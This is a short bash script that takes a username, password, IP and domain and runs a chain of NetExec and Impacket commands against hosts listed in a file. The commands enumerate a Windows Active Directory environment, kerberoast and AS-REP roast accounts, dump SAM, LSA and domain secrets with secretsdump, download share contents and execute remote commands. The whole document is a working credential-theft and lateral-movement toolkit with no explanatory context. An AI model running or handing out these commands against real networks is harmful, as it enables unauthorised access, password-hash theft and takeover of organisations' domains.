#!/bin/bash

# Prompt for user input
read -p "Enter the username: " user
read -s -p "Enter the password: " password
echo
read -p "Enter the IP address: " ip
read -p "Enter the domain: " domain

# Execute commands with provided variables
commands=(
    "nxc smb hosts.txt -u \"$user\" -p \"$password\" --users"
    "nxc smb hosts.txt -u \"$user\" -p \"$password\" --shares --rid-brute"
    "nxc smb hosts.txt -u \"$user\" -p \"$password\" --local-group"
    "nxc smb hosts.txt -u \"$user\" -p \"$password\" --groups"  
    "nxc smb hosts.txt -u \"$user\" -p \"$password\" -M spider_plus -o DOWNLOAD_FLAG=True"
    "nxc ldap hosts.txt -u \"$user\" -p \"$password\" --bloodhound --collection All --dns-server \"$ip\""
    "nxc ldap hosts.txt -u \"$user\" -p \"$password\" --kerberoast output.txt"
    "nxc ldap hosts.txt -u \"$user\" -p \"$password\" -M adcs"
    "nxc ldap hosts.txt -u \"$user\" -p \"$password\" -M enum_ca"
    "nxc winrm hosts.txt -u \"$user\" -p \"$password\" -X 'whoami'"
    "nxc smb hosts.txt -u \"$user\" -p \"$password\" -M schtask_as -o User=\"$user\" CMD=whoami"
    "nxc smb hosts.txt -u \"$user\" -p \"$password\" --sam"
    "nxc smb hosts.txt -u \"$user\" -p \"$password\" --loggedon-users"
    "nxc rdp hosts.txt -u \"$user\" -p \"$password\" --local-auth"
    "nxc smb hosts.txt -u \"$user\" -p \"$password\" -M reg-winlogon --rid-brute"
    "/usr/bin/impacket-GetADUsers -all \"$domain/$user:$password\" -dc-ip \"$ip\""
    "/usr/bin/impacket-GetUserSPNs -dc-ip \"$ip\" \"$domain/$user:$password\" -request"
    "/usr/bin/impacket-GetNPUsers -dc-ip \"$ip\" -request -outputfile hashes.asreproast \"$domain/$user:$password\""
    "/usr/share/doc/python3-impacket/examples/secretsdump.py \"$domain/$user:$password@$ip\""
    "nxc smb hosts.txt -u \"$user\" -p \"$password\" --lsa"
)

for cmd in "${commands[@]}"; do
    echo "Executing: $cmd"
    eval $cmd
done
